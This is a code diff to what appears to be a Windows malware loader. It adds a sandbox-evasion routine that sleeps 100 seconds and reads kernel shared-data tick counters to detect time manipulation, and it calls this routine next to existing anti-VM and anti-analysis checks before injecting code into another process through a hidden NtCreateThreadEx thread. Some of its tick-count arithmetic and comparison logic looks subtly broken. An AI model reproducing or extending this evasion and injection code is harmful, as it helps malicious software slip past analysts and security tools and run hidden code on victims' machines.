@@ -7,6 +7,25 @@
 
 // Stops thread from sending events
 #define THREAD_FLAG_HIDE 0x4
+#define SHARED_DATA_MULTIPLIER 0x7ffe0004
+#define SHARED_DATA_HIGHPART 0x7ffe0324
+#define SHARED_DATA_LOWPART 0x7ffe0320
+
+// Delay execution and check for system uptime manipulation manually to avoid hooks
+void DelayExecution()
+{
+	Sleep(100000); // 100 seconds
+	
+	ULONG* PUserSharedData_TickCountMultiplier = (PULONG)SHARED_DATA_MULTIPLIER;
+	LONG* PUserSharedData_HighPart = (PLONG)SHARED_DATA_HIGHPART;
+	ULONG* PUserSharedData_LowPart = (PULONG)SHARED_DATA_LOWPART;
+	DWORD time = GetTickCount64();
+	
+	DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_HighPart << 8) +
+		((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
+	
+	if ((time - kernelTime) > 100 && (kernelTime - time) > 100) exit(0);
+}
 
 void Run()
 {
@@ -70,8 +89,7 @@ void Run()
 	//NtAllocateVirtualMemory(hProcess, &pCode, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	//NtWriteVirtualMemory(hProcess, pCode, &code, size, nullptr);
 
-	NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pCode, 
-		NULL, THREAD_FLAG_HIDE, NULL, NULL, NULL, NULL);
+	NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pCode, NULL, THREAD_FLAG_HIDE, NULL, NULL, NULL, NULL);
 	WaitForSingleObject(hThread, INFINITE);
 }
 
@@ -81,7 +99,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
 	AnalysisToolsRunning();
 	SystemHasCorrectHardware();
 	SystemHasVmDeviceNames();
-
+	DelayExecution();
+	
 	Run();
+	
 	return 0;
 }
